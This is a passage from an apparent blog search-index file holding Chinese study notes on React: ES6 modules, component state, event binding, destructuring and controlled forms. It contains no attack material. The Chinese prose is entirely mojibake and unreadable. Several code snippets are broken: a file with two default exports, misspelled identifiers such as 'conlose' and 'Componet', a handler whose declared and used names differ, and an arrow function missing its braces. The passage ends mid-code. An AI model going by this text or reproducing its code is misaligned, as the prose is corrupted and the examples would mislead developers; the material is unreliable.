å°†å­¦ä¼šçš„å¦å¤–ä¸€ä¸ªè¯é¢˜æ˜¯æµ‹è¯•ï¼Œè¿™å¯¹ä½ çš„ä»£ç å¥å£®æ€§éžå¸¸é‡è¦ã€‚æœ¬ç« ä¹Ÿä¼šç»“åˆä¹‹å‰çš„ç»ƒä¹ é¡¹ç›®æ¥ä¸ºä½ ä»‹ç»è¿™å‡ ä¸ªè¯é¢˜ã€‚ ES6æ¨¡å—ï¼š Import å’Œ Exportåœ¨ JavaScript ES6 ä¸­å¯ä»¥ä»Žæ¨¡å—ä¸­å¯¼å…¥å’Œå¯¼å‡ºæŸäº›åŠŸèƒ½ï¼Œè¿™äº›åŠŸèƒ½å¯ä»¥æ˜¯å‡½æ•°ã€ç±»ã€ç»„ä»¶ã€å¸¸é‡ç­‰ç­‰ã€‚åŸºæœ¬ä¸Šå¯ä»¥å°†æ‰€æœ‰ä¸œè¥¿éƒ½èµ‹å€¼åˆ°ä¸€ä¸ªå˜é‡ä¸Šã€‚æ¨¡å—å¯ä»¥æ˜¯å•ä¸ªæ–‡ä»¶ï¼Œæˆ–è€…ä¸€ä¸ªå¸¦æœ‰å…¥å£æ–‡ä»¶çš„æ–‡ä»¶å¤¹ import ä¸Ž export è¯­å¥å¯ä»¥è®©æˆ‘ä»¬åœ¨ä¸åŒçš„æ–‡ä»¶å…±äº«ä»£ç ï¼Œè¿™äº›è¯­è¨€æœ‰åˆ©äºŽä»£ç çš„åˆ†å‰²ã€‚ä»£ç é£Žæ ¼å°±æ˜¯å°†ä»£ç åˆ†é…åˆ°å¤šä¸ªæ–‡ä»¶å¤¹ä¸­åŽ»ï¼Œä»¥ä¿æŒä»£ç çš„é‡ç”¨æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚å‰è€…å¾—ä»¥æˆç«‹æ—¶å› ä¸ºå¯ä»¥åœ¨ä¸åŒçš„æ–‡ä»¶ä¸­å¯¼å…¥ç›¸åŒçš„ä»£ç ç‰‡æ®µï¼Œè€ŒåŽè€…å¾—ä»¥æˆç«‹æ˜¯å› ä¸ºç»´æŠ¤çš„ä»£ç æ—¶å”¯ä¸€çš„ä»£ç æº æœ€åŽä¸€ç‚¹æ˜¯ï¼Œå®ƒèƒ½å¸®åŠ©æˆ‘ä»¬æ€è€ƒä»£ç å°è£…ã€‚ä¸æ˜¯æ‰€æœ‰çš„åŠŸèƒ½éƒ½éœ€è¦ä»Žä¸€ä¸ªæ–‡ä»¶å¯¼å‡ºã€‚å…¶ä¸­ä¸€äº›åŠŸèƒ½åº”è¯¥åªåœ¨å®šä¹‰å®ƒçš„æ–‡ä»¶å¤¹ä¸­ä½¿ç”¨ã€‚ä¸€ä¸ªæ–‡ä»¶å¯¼å‡ºçš„åŠŸèƒ½æ˜¯è¿™ä¸ªæ–‡ä»¶å…¬å…± API ï¼Œåªæœ‰å¯¼å‡ºçš„åŠŸèƒ½æ‰èƒ½è¢«å…¶ä»–åœ°æ–¹é‡ç”¨ã€‚éµå¾ªäº†å°è£…çš„æœ€ä½³å®žè·µ å¯ä»¥å¯¼å‡ºä¸€ä¸ªæˆ–è€…å¤šä¸ªå˜é‡ï¼Œç§°ä¸ºä¸€ä¸ªå‘½åçš„å¯¼å‡º file1.js const firstname = â€˜laiâ€™,const lastname = â€˜bhâ€™,export { firstname , lastname }; å¹¶åœ¨å¦å¤–ä¸€ä¸ªæ–‡ä»¶ä¸­å¼•ç”¨file2.js import { firstname, lastname } from â€˜./file1.jsâ€™;console.log(firstname); // lai ä¹Ÿå¯ä»¥ç”¨å¯¹è±¡çš„æ–¹å¼å¯¼å…¥å¦å¤–æ–‡ä»¶çš„å…¨éƒ¨å˜é‡file2.js import * as person from â€˜./file1.jsâ€™;console.log(person.firstname); // lai å¯¼å…¥å¯ä»¥æœ‰ä¸€ä¸ªåˆ«åï¼Œå¯èƒ½å‘ç”Ÿåœ¨è¾“å‡ºå¤šä¸ªæ–‡ä»¶ä¸­æœ‰ç›¸åŒå‘½åçš„å¯¼å‡ºçš„æ—¶å€™ã€‚file2.js import { firstname as foo } from â€˜./file1.jsâ€™console.log(foo); // lai è¿˜æœ‰ä¸€ç§æƒ…å†µ default è¯­å¥ï¼Œå¯ä»¥è¢«ç”¨åœ¨ä»¥ä¸‹æƒ…å†µä¸ºäº†å¯¼å‡ºå’Œå¯¼å…¥å•ä¸€åŠŸèƒ½ä¸ºäº†å¼ºè°ƒä¸€ä¸ªæ¨¡å—è¾“å‡º API ä¸­çš„ä¸»è¦åŠŸèƒ½è¿™æ ·å¯ä»¥å‘åŽå…¼å®¹ ES5 åªæœ‰ä¸€ä¸ªå¯¼å‡ºç‰©çš„åŠŸèƒ½ file1.js const lbh = { firstname:â€™laiâ€™, lastname:â€™bhâ€™};export default lbh; å¯ä»¥åœ¨å¯¼å…¥ default è¾“å‡ºæ—¶çœç•¥èŠ±æ‹¬å·file2.js import developer from â€˜./file1.jsâ€™console.log(developer); // { firstname:â€™laiâ€™,lastname:â€™bhâ€™} å¦å¤–ï¼Œè¾“å…¥åç§°å¯ä»¥ä¸Žå¯¼å…¥çš„ default åç§°ä¸ä¸€æ ·ï¼Œä¹Ÿå¯ä»¥å°†å…¶ä¸Žå‘½åçš„å¯¼å‡ºä¸Žå¯¼å…¥è¯­å¥ä½¿ç”¨åŒä¸€ä¸ªåç§°file1.js const firstname = â€˜laiâ€™,const lastname = â€˜bhâ€™,const lbh = { firstname, lastname};export{ firstname, lastname};export default lbh file2.js import lbh, { firstname, lastname } from â€˜./file1.jsâ€™;console.log(lbh); // { firstname:â€™laiâ€™,lastname:â€™bhâ€™}console.log(firstname, lastname); // (lai,bh) åœ¨å‘½åçš„å¯¼å‡ºä¸­ï¼Œå¯ä»¥çœç•¥å¤šä½™è¡Œç›´æŽ¥å¯¼å‡ºå˜é‡ export default firstname = â€˜laiâ€™;export default lastname = â€˜bhâ€™; ä»£ç ç»„ç»‡ä¸ŽES6æ¨¡å—å¯èƒ½ä¼šç”¨åˆ°çš„æ¨¡å—ç»“æž„ 123456789101112131415src/ index.js index.css App.js App.test.js App.css Button.js Button.test.js Button.css Table.js Table.test.js Table.css Search.js Search.test.js Search.css è¿™é‡Œå°†ç»„ä»¶å°è£…åˆ°å„è‡ªæ–‡ä»¶ä¸­ï¼Œä½†æ˜¯è¿™çœ‹èµ·æ¥ä¸æ˜¯å¾ˆå¥½ã€‚ä½ å¯ä»¥çœ‹åˆ°éžå¸¸å¤šçš„å‘½åå†—ä½™ï¼Œå¹¶ä¸”åªæœ‰æ–‡ä»¶çš„æ‰©å±•æ–‡å­—ä¸åŒã€‚å¦å¤–ä¸€ç§æ¨¡å—çš„ç»“æž„å¤§æ¦‚ç±»ä¼¼ï¼š 12345678910111213141516171819src/ index.js index.css App/ index.js test.js index.css Button/ index.js test.js index.css Table/ index.js test.js index.css Search/ index.js test.js index.css è¿™çœ‹èµ·æ¥æ¯”ä¹‹å‰æ¸…æ™°å¤šäº†ã€‚æ–‡ä»¶åä¸­çš„ index åç§°è¡¨ç¤ºä»–æ˜¯è¿™ä¸ªæ–‡ä»¶å¤¹çš„å…¥å£æ–‡ä»¶ã€‚è¿™ä»…ä»…æ˜¯ä¸€ä¸ªå‘½åå…±è¯†ï¼Œä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ä½ ä¹ æƒ¯çš„å‘½åã€‚åœ¨è¿™ä¸ªæ¨¡å—ç»“æž„ä¸­ï¼Œä¸€ä¸ªç»„ä»¶è¢« JavaScript æ–‡ä»¶ä¸­ç»„ä»¶å£°æ˜Žï¼Œæ ·å¼æ–‡ä»¶ï¼Œæµ‹è¯•å…±åŒå®šä¹‰ã€‚ å¦å¤–ä¸€ä¸ªæ­¥éª¤å¯èƒ½è¦å°† App ç»„ä»¶ä¸­çš„å˜é‡æŠ½å‡ºã€‚è¿™äº›å˜é‡ç”¨æ¥ç»„åˆå‡º Hacker News çš„ API URLã€‚ 123456789101112131415src/ index.js index.css constants/ index.js components/ App/ index.js test.js index..css Button/ index.js test.js index..css ... è‡ªç„¶è¿™äº›æ¨¡å—ä¼šåˆ†å‰²åˆ° src/constants/ å’Œ src/components/ ä¸­åŽ»ã€‚çŽ°åœ¨ src/constants/index.js æ–‡ä»¶å¯èƒ½çœ‹èµ·æ¥ç±»ä¼¼ä¸‹é¢è¿™æ ·ï¼š Code Playground: src/constants/index.js 1234567export const DEFAULT_QUERY = &apos;redux&apos;;export const DEFAULT_HPP = &apos;100&apos;;export const PATH_BASE = &apos;https://hn.algolia.com/api/v1&apos;;export const PATH_SEARCH = &apos;/search&apos;;export const PARAM_SEARCH = &apos;query=&apos;;export const PARAM_PAGE = &apos;page=&apos;;export const PARAM_HPP = &apos;hitsPerPage=&apos;; App/index.js æ–‡ä»¶å¯ä»¥å¯¼å…¥è¿™äº›å˜é‡ï¼Œä»¥ä¾¿ä½¿ç”¨ã€‚ Code Playground: src/components/App/index.js 123456789import &#123;DEFAULT_QUERY,DEFAULT_HPP,PATH_BASE,PATH_SEARCH,PARAM_SEARCH,PARAM_PAGE,PARAM_HPP,&#125; from &apos;../constants/index.js&apos;; å½“ä½ ä½¿ç”¨ index.js è¿™ä¸ªå‘½åå…±è¯†çš„æ—¶å€™ï¼Œä½ å¯ä»¥åœ¨ç›¸å¯¹è·¯å¾„ä¸­çœç•¥æ–‡ä»¶åã€‚ 123456789101112Code Playground: src/components/App/index.jsimport &#123; DEFAULT_QUERY, DEFAULT_HPP, PATH_BASE, PATH_SEARCH, PARAM_SEARCH, PARAM_PAGE, PARAM_HPP,&#125; from &apos;../constants&apos;;... ä½†æ˜¯ index.js æ–‡ä»¶åç§°åŽé¢å‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿè¿™ä¸ªçº¦å®šæ˜¯åœ¨ node.js ä¸–ç•Œé‡Œé¢è¢«å¼•å…¥çš„ã€‚index æ–‡ä»¶æ˜¯ä¸€ä¸ªæ¨¡å—çš„å…¥å£ã€‚å®ƒæè¿°äº†ä¸€ä¸ªæ¨¡å—çš„å…¬å…± APIã€‚å¤–éƒ¨æ¨¡å—åªå…è®¸é€šè¿‡ index.js æ–‡ä»¶å¯¼å…¥æ¨¡å—ä¸­çš„å…±äº«ä»£ç ã€‚è€ƒè™‘ç”¨ä¸‹é¢è™šæž„çš„æ¨¡å—ç»“æž„è¿›è¡Œæ¼”ç¤ºï¼š 123456789src/ index.js App/ index.js Buttons/ index.js SubmitButton.js SaveButton.js CancelButton.js è¿™ä¸ª Buttons/ æ–‡ä»¶å¤¹æœ‰å¤šä¸ªæŒ‰é’®ç»„ä»¶å®šä¹‰åœ¨äº†ä¸åŒçš„æ–‡ä»¶ä¸­ã€‚æ¯ä¸ªæ–‡ä»¶éƒ½ export default ç‰¹å®šçš„ç»„ä»¶ï¼Œä½¿ç»„ä»¶èƒ½å¤Ÿè¢« Buttons/index.js å¯¼å…¥ã€‚Buttons/index.js æ–‡ä»¶å¯¼å…¥æ‰€æœ‰ä¸åŒçš„è¡¨çŽ°çš„æŒ‰é’®ï¼Œå¹¶å°†ä»–ä»¬å¯¼å‡ºä½œä¸ºæ¨¡å—çš„å…¬å…± APIã€‚ Code Playground: src/Buttons/index.js 123456789import SubmitButton from &apos;./SubmitButton&apos;;import SaveButton from &apos;./SaveButton&apos;;import CancelButton from &apos;./CancelButton&apos;;export &#123; SubmitButton, SaveButton, CancelButton,&#125;; çŽ°åœ¨ src/App/index.js å¯ä»¥é€šè¿‡å®šä½åœ¨ index.js æ–‡ä»¶æ¨¡å—çš„å…¬å…± API å¯¼å…¥è¿™äº›æŒ‰é’®ã€‚Code Playground: src/App/index.js 12345import &#123; SubmitButton, SaveButton, CancelButton&#125; from &apos;../Buttons&apos;; å‚è€ƒé“¾æŽ¥ï¼šhttps://leanpub.com/the-road-to-learn-react-chinese]]></content>
      <categories>
        <category>reactç›¸å…³</category>
      </categories>
      <tags>
        <tag>react</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[The Road to learn React Part2]]></title>
    <url>%2F2018-06-07-TheRoadtolearnReactPart2.html</url>
    <content type="text"><![CDATA[The Road to learn Reactä¹¦ç±å­¦ä¹ ç¬”è®°(ç¬¬äºŒç« )ç»„ä»¶çš„å†…éƒ¨çŠ¶æ€ç»„ä»¶çš„å†…éƒ¨çŠ¶æ€ä¹Ÿç§°ä¸ºå±€éƒ¨çŠ¶æ€ï¼Œå…è®¸ä¿å­˜ã€ä¿®æ”¹å’Œåˆ é™¤åœ¨ç»„ä»¶å†…éƒ¨çš„å±žæ€§ï¼Œä½¿ç”¨ES6ç±»ç»„ä»¶å¯ä»¥åœ¨æž„é€ å‡½æ•°ä¸­åˆå§‹åŒ–ç»„ä»¶çš„çŠ¶æ€ã€‚æž„é€ å‡½æ•°åªä¼šåœ¨ç»„ä»¶åˆå§‹åŒ–çš„æ—¶å€™è°ƒç”¨ä¸€æ¬¡ ç±»æž„é€ å‡½æ•° 12345class App extends Component&#123; constructor(props)&#123; super(props); &#125;&#125; ä½¿ç”¨ES6ç¼–å†™çš„ç»„ä»¶æœ‰ä¸€ä¸ªæž„é€ å‡½æ•°æ—¶ï¼Œéœ€è¦å¼ºåˆ¶åœ°ä½¿ç”¨ super() æ–¹æ³•ï¼Œ å› ä¸ºè¿™ä¸ª Appç»„ä»¶ æ˜¯ Component çš„å­ç±»ï¼Œå› ä¸ºéœ€è¦åœ¨ Appç»„ä»¶ å£°æ˜Ž extends Componentä¹Ÿå¯ä»¥è°ƒç”¨ super(props)ï¼Œå®ƒä¼šåœ¨æž„é€ å‡½æ•°ä¸­è®¾ç½® this.props ä»¥ä¾›æž„é€ å‡½æ•°ä¸­è®¿é—®ã€‚å¦åˆ™åœ¨æž„é€ å‡½æ•°ä¸­è®¿é—® this.props ï¼Œä¼šå¾—åˆ° undefined ä¾‹å­ï¼Œç»„ä»¶çš„åˆå§‹çŠ¶æ€æ˜¯ä¸€ä¸ªåˆ—è¡¨ 12345678910111213141516171819const list = [ &#123; title:&apos;React&apos;, url: &apos;https://facebook.github.io/react/&apos;, author: &apos;Jordan Walke&apos;, num_comments: 3, points: 4, objectID: 0, &#125;];class App extends Component&#123; constructor(props)&#123; super(props); this.state = &#123; list : list, &#125; &#125;&#125; state é€šè¿‡ä½¿ç”¨ this ç»‘å®šåœ¨ç±»ä¸Šï¼Œå› æ­¤å¯ä»¥åœ¨æ•´ä¸ªç»„ä»¶ä¸­è®¿é—®åˆ° stateã€‚é€šè¿‡ render() æ–¹æ³•å¯ä»¥æ˜ å°„ä¸€ä¸ªåœ¨ç»„ä»¶å¤–å®šä¹‰é™æ€åˆ—è¡¨ 1234567891011121314151617class App extends Component&#123; render()&#123; return( &lt;div className = &quot;App&quot;&gt; &#123;this.state.list.map(item =&gt; &lt;div key = &#123;item.objectID&#125;&gt; &lt;span&gt;&lt;a href = &#123;item.url&#125;&gt;&#123;item.title&#125;&lt;/a&gt;&lt;/span&gt; &lt;span&gt;&#123;item.author&#125;&lt;/span&gt; &lt;span&gt;&#123;item.num_comments&#125;&lt;/span&gt; &lt;span&gt;&#123;item.points&#125;&lt;/span&gt; &lt;/div&gt; ) &#125; &lt;/div&gt; ); &#125;&#125; çŽ°åœ¨listæ˜¯ã¢Ÿçš„ä¸€éƒ¨åˆ†ï¼Œå®ƒåœ¨ç»„ä»¶çš„ state ä¸­ï¼Œå¯ä»¥ä»Žlistæ·»åŠ ã€ä¿®æ”¹ã€åˆ é™¤åˆ—è¡¨é¡¹ã€‚ç»„ä»¶çš„ render ä¼šå†æ¬¡è¿è¡Œï¼Œå¯ä»¥ç®€å•ä¿®æ”¹ç»„ä»¶å†…éƒ¨çŠ¶æ€ï¼Œç¡®ä¿ç»„ä»¶é‡æ–°æ¸²æŸ“å¹¶ä¸”å±•ç¤ºä»Žå†…éƒ¨çŠ¶æ€èŽ·å–åˆ°çš„æ­£ç¡®æ•°æ®ä¿®æ”¹ state å¯ä»¥ä½¿ç”¨ setState() æ–¹æ³•æ¥ä¿®æ”¹ ES6 å¯¹è±¡åˆå§‹åŒ–åˆå§‹åŒ–ä¾‹å­ 1234const name = &apos;Laibh&apos;;const user = &#123; name ï¼š name&#125;; å½“å¯¹è±¡ä¸­å±žæ€§åä¸Žå˜é‡åç›¸åŒæ—¶å¯ä»¥å¦‚ä¸‹æ“ä½œ 1234const name = &apos;Laibh&apos;; const user = &#123; name&#125;; åœ¨åº”ç”¨ç¨‹åºä¸­ï¼Œåˆ—è¡¨å˜é‡åä¸ŽçŠ¶æ€å±žæ€§åç§°å…±äº«åŒä¸€åç§° 123456789//ES5 this.state = &#123; list:list&#125;//ES6this.state = &#123; list&#125;; ç®€å†™æ–¹æ³•å 12345678910111213//ES5var userService = &#123; getUserName :function(user)&#123; return user.firstname + &apos; &apos; + user.lastname; &#125;&#125;//ES6const userService = &#123; getUserName(user)&#123; return user.firstname + &apos; &apos; + user.lastname; &#125;&#125; è®¡ç®—å±žæ€§å 12345678910//ES5var user = &#123; name:&apos;Laibh&apos;&#125;//ES6const key = &apos;name&apos;;const user = &#123; [key] :&apos;Laibh&apos;&#125; å•å‘æ•°æ®æµç»„ä»¶ä¸­æœ‰ä¸€äº›å†…éƒ¨çš„ stateï¼Œç»ƒä¹  state æ“ä½œçš„å¥½æ–¹å¼å¢žåŠ ä¸€äº›ç»„ä»¶çš„äº’åŠ¨ä¸ºåˆ—è¡¨å¢žåŠ ä¸€ä¸ªåˆ é™¤æŒ‰é’® 123456789101112131415161718192021222324252627 class App extends Component &#123; render() &#123; return ( &lt;div className=&quot;App&quot;&gt; &#123;this.state.list.map(item =&gt; &lt;div key=&#123;item.objectID&#125;&gt; &lt;span&gt; &lt;a href=&#123;item.url&#125;&gt;&#123;item.title&#125;&lt;/a&gt; &lt;/span&gt; &lt;span&gt;&#123;item.author&#125;&lt;/span&gt; &lt;span&gt;&#123;item.num_comments&#125;&lt;/span&gt; &lt;span&gt;&#123;item.points&#125;&lt;/span&gt; &lt;span&gt; &lt;button onClick=&#123;() =&gt; this.onDismiss(item.objectID)&#125; type=&quot;button&quot; &gt; Dismiss &lt;/button&gt; &lt;/span&gt; &lt;/div&gt; )&#125; &lt;/div&gt; ); &#125;&#125; ä¸Šé¢ç±»ä¸­ï¼ŒonDismiss() è¿˜æ²¡æœ‰è¢«å®šä¹‰ï¼Œå®ƒé€šè¿‡idæ¥æ ‡è¯†å“ªä¸ªåº”è¯¥è¢«åˆ é™¤ï¼Œæ­¤å‡½æ•°ç»‘å®šåˆ°ç±»ï¼Œå°±æˆä¸ºäº†ç±»æ–¹æ³•ï¼Œæ‰€ä»¥è®¿é—®å®ƒçš„æ—¶å€™è¦ç”¨ this.onDismiss() è€Œä¸æ˜¯ç”¨ onDismiss() ã€‚this å¯¹è±¡æ˜¯ç±»çš„å®žä¾‹ï¼Œä¸ºäº†å°† onDismiss() å®šä¹‰ä¸ºç±»æ–¹æ³•ï¼Œéœ€è¦åœ¨æž„é€ å‡½æ•°ä¸­ç»‘å®šå®ƒã€‚å¹¶å®šä¹‰å®ƒçš„é€»è¾‘åŠŸèƒ½ 12345678910111213141516171819 class App extends Component &#123; constructor(props) &#123; super(props); this.state = &#123; list, &#125;; this.onDismiss = this.onDismiss.bind(this); &#125; onDismiss(id) &#123; ... &#125; render() &#123; ... &#125;&#125; å¯ä»¥ä½¿ç”¨JavaScriptå†…ç½®çš„ filter æ–¹æ³•æ¥åˆ é™¤åˆ—è¡¨çš„ä¸€é¡¹ï¼Œå®ƒä¼šéåŽ†æ•´ä¸ªåˆ—è¡¨ï¼Œé€šè¿‡æ¡ä»¶æ¥è¿‡æ»¤ï¼ŒåŒ¹é…çš„è¿”å›ž true å¹¶ç•™åœ¨åˆ—è¡¨ä¸­ 12345onDismiss(id)&#123; const updateList = this.state.list.filter(function isNotId(item)&#123; return item.objectID !== id &#125;);&#125; æˆ–è€…ä¸€è¡Œç®­å¤´å‡½æ•° 123onDismiss(id)&#123; const updateList = this.state.list.filter(item =&gt; item.objectID !== id);&#125; æŽ¥ç€è¦æ›´æ–°æ•°æ® 1this.setState(&#123;list:updateList&#125;); ç»‘å®šç±»ä¸ä¼šè‡ªåŠ¨ç»‘å®š this åˆ°å®žä¾‹ä¸Šéœ€è¦è‡ªå·±ç»‘å®š 12345constructor() &#123; super(); this.onClickMe = this.onClickMe.bind(this); &#125; ç±»çš„ç»‘å®šæ–¹æ³•ä¹Ÿæœ‰äººå†™åœ¨å…¶ä»–åœ°æ–¹ï¼Œä¾‹å¦‚render()å‡½æ•°ä¸­ 12345render()&#123; return( &lt;button onClick = &#123;this.onClickMe.bind(this)&#125;&gt;Click Me&lt;/button&gt; )&#125; ä½†æ˜¯åº”è¯¥é¿å…è¿™æ ·ä½¿ç”¨ï¼Œå› ä¸ºå®ƒä¼šåœ¨æ¯æ¬¡ render() æ–¹æ³•æ‰§è¡Œçš„æ—¶ç»‘å®šç±»æ–¹æ³•ã€‚ç»„ä»¶æ¯æ¬¡æ›´æ–°éƒ½ä¼šå¯¼è‡´æ€§èƒ½æ¶ˆè€—ï¼Œå½“åœ¨æž„é€ å‡½æ•°ä¸­ç»‘å®šçš„æ—¶å€™ï¼Œç»‘å®šåªä¼šåœ¨ç»„ä»¶å®žä¾‹åŒ–æ—¶è¿è¡Œä¸€æ¬¡ï¼Œè¿™æ ·æ˜¯ä¸€ä¸ªæ›´å¥½çš„æ–¹å¼ å¦å¤–æœ‰ä¸€äº›äººå‰”é™¤åœ¨æž„é€ å‡½æ•°ä¸­å®šä¹‰ä¸šåŠ¡é€»è¾‘ç±»æ–¹æ³• 123456constructor()&#123; super(); this.onClick = () =&gt;&#123; conlose.log(this); &#125;&#125; è¿™æ ·éšç€æ—¶é—´æŽ¨ç§»ä¼šè®©æž„é€ å‡½æ•°å˜å¾—æ··ä¹±ï¼Œé¿å…ä½¿ç”¨ã€‚æž„é€ å‡½æ•°çš„ç›®çš„åªæ˜¯å®žä¾‹åŒ–ç±»ä»¥åŠæ‰€æœ‰çš„å±žæ€§ äº‹ä»¶å¤„ç†12345&lt;button onClick=&#123;() =&gt; this.onDismiss(item.objectID)&#125; type=&quot;button&quot;&gt; Dismiss&lt;/button&gt; å½“ä¼ é€’ä¸€ä¸ªå‚æ•°åˆ°ç±»çš„æ–¹æ³•ï¼Œéœ€è¦å°†å®ƒå°è£…åˆ°å¦ä¸€ä¸ªï¼ˆç®­å¤´ï¼‰å‡½æ•°ä¸­ï¼Œç”±äºŽè¦ä¼ é€’ç»™äº‹ä»¶å¤„ç†å™¨ä½¿ç”¨ï¼Œå› ä¸ºå®ƒå¿…é¡»æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè€Œä¸‹é¢çš„è¿™ä¸ªä»£ç ä¸ä¼šå·¥ä½œã€‚å› ä¸ºç±»æ–¹æ³•ä¼šåœ¨æµè§ˆå™¨ä¸­æ‰“å¼€ç¨‹åºæ—¶å€™ç«‹å³æ‰§è¡Œ 123&lt;button onClick = &#123;this.onDismiss(item.objectID)&#125;&gt; Dismiss&lt;/button&gt; å€˜è‹¥å†™æˆ 123&lt;button onClick = &#123;onDismiss&#125;&gt; Dismiss&lt;/button&gt; å°±ä¸ä¼šç«‹å³æ‰§è¡Œï¼Œä½†æ˜¯éœ€è¦ä¼ å‚æ•°ï¼Œæ‰€ä»¥å°±ä¸è¿™ä¹ˆç”¨ å¦å¤–çš„ä¸€ä¸ªè§£å†³æ–¹æ¡ˆæ˜¯åœ¨å¤–éƒ¨å®šä¹‰ä¸€ä¸ªåŒ…è£…å‡½æ•°ï¼Œå¹¶ä¸”åªå°†å®šä¹‰çš„å‡½æ•°ä¼ é€’ç»™å¤„ç†ç¨‹åºã€‚å› ä¸ºéœ€è¦è®¿é—®ç‰¹å®šçš„åˆ—è¡¨é¡¹ï¼Œæ‰€ä»¥å®ƒå¿…é¡»ä½äºŽ map å‡½æ•°å—çš„å†…éƒ¨ 12345678910111213141516171819202122232425262728293031class App extends Component&#123; render()&#123; return( &lt;div className = &quot;App&quot;&gt; &#123;this.state.list.map(item =&gt; const onHandldDismiss = () =&gt; this.onDismiss(item.objectID); return( &lt;div key=&#123;item.objectID&#125;&gt; &lt;span&gt; &lt;a href=&#123;item.url&#125;&gt;&#123;item.title&#125;&lt;/a&gt; &lt;/span&gt; &lt;span&gt;&#123;item.author&#125;&lt;/span&gt; &lt;span&gt;&#123;item.num_comments&#125;&lt;/span&gt; &lt;span&gt;&#123;item.points&#125;&lt;/span&gt; &lt;span&gt; &lt;button onClick=&#123;onHandleDismiss&#125; type=&quot;button&quot; &gt; Dismiss &lt;/button&gt; &lt;/span&gt; &lt;/div&gt; ) )&#125; &lt;/div&gt; ) &#125;&#125; åœ¨äº‹ä»¶å¤„ç†ç¨‹åºä¸­ä½¿ç”¨ç®­å¤´å‡½æ•°å¯¹æ€§èƒ½ä¼šæœ‰å½±å“ å’Œè¡¨å•äº’åŠ¨123456789101112131415const list = [&#123; title: &apos;React&apos;, url: &apos;https://facebook.github.io/react&apos;, author: &apos;Jordan Walke&apos;, num_comments: 3, points: 4, objectID: 0,&#125;, &#123; title: &apos;Redux&apos;, url: &apos;https://github.com/reactjs/redux&apos;, author: &apos;Dan Abramov, Andrew Clark&apos;, num_comments: 2, points: 5, objectID: 1, &#125;]; 1234567891011121314151617181920212223242526272829303132333435363738394041424344const isSearched = searchText =&gt; item =&gt; item.title.toLowerCase().includes(searchText.toLowerCase());class FormP extends Component&#123; constructor(props)&#123; super(props); this.state = &#123;list,searchText:&apos;&apos;&#125;; this.onSearchChange = this.onSearchChange.bind(this); this.onDismiss = this.onDismiss.bind(this); &#125; onSearchChange(e)&#123; this.setState(&#123;searchText:e.target.value&#125;); &#125; onDismiss(id)&#123; console.log(this); const updateList = this.state.list.filter(item =&gt; item.objectID !== id ); this.setState(&#123;list:updateList&#125;); &#125; render()&#123; return( &lt;div className = &quot;FormP&quot;&gt; &lt;form&gt; &lt;input type=&quot;text&quot; onChange = &#123;this.onSearchChange&#125;/&gt; &lt;/form&gt; &#123;this.state.list.filter(isSearched(this.state.searchText)).map( item =&gt; &lt;div key = &#123;item.objectID&#125;&gt; &lt;span&gt; &lt;a href= &#123;item.url&#125;&gt;&#123;item.title&#125;&lt;/a&gt; &lt;/span&gt; &lt;span&gt;&#123;item.author&#125;&lt;/span&gt; &lt;span&gt;&#123;item.num_comments&#125;&lt;/span&gt; &lt;span&gt;&#123;item.points&#125;&lt;/span&gt; &lt;span&gt; &lt;button onClick = &#123;()=&gt;this.onDismiss(item.objectID)&#125;&gt;Dismiss&lt;/button&gt; &lt;/span&gt; &lt;/div&gt; )&#125; &lt;/div&gt; ) &#125;&#125;export default FormP; ES6 è§£æž„ åœ¨JavaScript ES6 ä¸­æœ‰ä¸€ä¸ªæ›´æ–¹ä¾¿çš„æ–¹æ³•æ¥è®¿é—®å¯¹è±¡å’Œæ•°ç»„çš„å±žæ€§ï¼Œå«åšè§£æž„ã€‚ 1234567891011121314const user = &#123; firsname : &apos;L&apos;, lastname : &apos;binhong&apos;&#125;//ES5var firstname = user.firstname;var lastname = user.lastname;console.log(firstname + &apos;&apos; +lastname);//ES6const &#123;firstname, lastname&#125; = user;conlose.log(firstname + &apos;&apos; +lastname); åœ¨JavaScript ES5ä¸­æ¯æ¬¡è®¿é—®å¯¹è±¡çš„å±žæ€§éƒ½éœ€è¦é¢å¤–æ·»åŠ ä¸€è¡Œä»£ç ï¼Œä½†æ˜¯ES6ä¸­å°±å¯ä»¥åœ¨ä¸€è¡Œä¸­è¿›è¡Œï¼Œå¯è¯»æ€§æœ€å¥½çš„æ–¹æ³•å°±æ˜¯å°†å¯¹è±¡è§£æž„æˆå¤šä¸ªå±žæ€§æ—¶ä½¿ç”¨å¤šè¡Œå¯¹äºŽæ•°ç»„ä¹Ÿå¯ä»¥ä½¿ç”¨è§£æž„ï¼Œå¯ä»¥ä¿æŒä»£ç çš„å¯è¯»æ€§ 12345678const user = [&apos;1&apos;,&apos;2&apos;,&apos;3&apos;];const [ a, b, c] = user;console.log(a,b,c); //1,2,3 å—æŽ§ç»„ä»¶è¡¨å•å…ƒç´  &lt;input&gt;/&lt;select&gt;/&lt;textarea&gt; ä¼šä»¥å…ƒç´ HTMLçš„å½¢å¼ä¿å­˜å®ƒä»¬è‡ªå·±çš„çŠ¶æ€ï¼Œä¸€æ—¦æœ‰äººä»Žå¤–éƒ¨åšäº†ä¿®æ”¹ï¼Œå°±ä¼šä¿®æ”¹å†…éƒ¨çš„å€¼ï¼Œåœ¨Reactä¸­è¿™è¢«ç§°ä¸ºä¸å—æŽ§ç»„ä»¶ï¼Œå› ä¸ºå®ƒä»¬è‡ªå·±å¤„ç†çŠ¶æ€ï¼Œåœ¨Reactä¸­ï¼Œæˆ‘ä»¬å¾—æŠŠå®ƒä»¬å˜æˆ å—æŽ§å…ƒç´  12345678910111213141516class App extends Componet&#123; render()&#123; const &#123;searchText,list&#125; = this.state; return( &lt;div className = &quot;App&quot;&gt; &lt;form&gt; &lt;input type = &quot;text&quot; value = &#123;searchText&#125; onChange = &#123;this.onSearchChange&#125; &gt;&lt;/input&gt; &lt;/form&gt; &lt;/div&gt; ) &#125;&#125; çŽ°åœ¨è¾“å…¥æ¡†çš„å•é¡¹æ•°æ®æµå¾ªçŽ¯æ˜¯è‡ªåŒ…å«çš„ï¼Œç»„ä»¶å†…éƒ¨çŠ¶æ€æ˜¯è¾“å…¥æ¡†çš„å”¯ä¸€æ•°æ®æ¥æº æ‹†åˆ†ç»„ä»¶ç”¨äºŽæœç´¢çš„è¾“å…¥ç»„ä»¶å’Œä¸€ä¸ªç”¨äºŽå±•ç¤ºçš„åˆ—è¡¨ç»„ä»¶ 1234567891011class App extends Componet&#123; 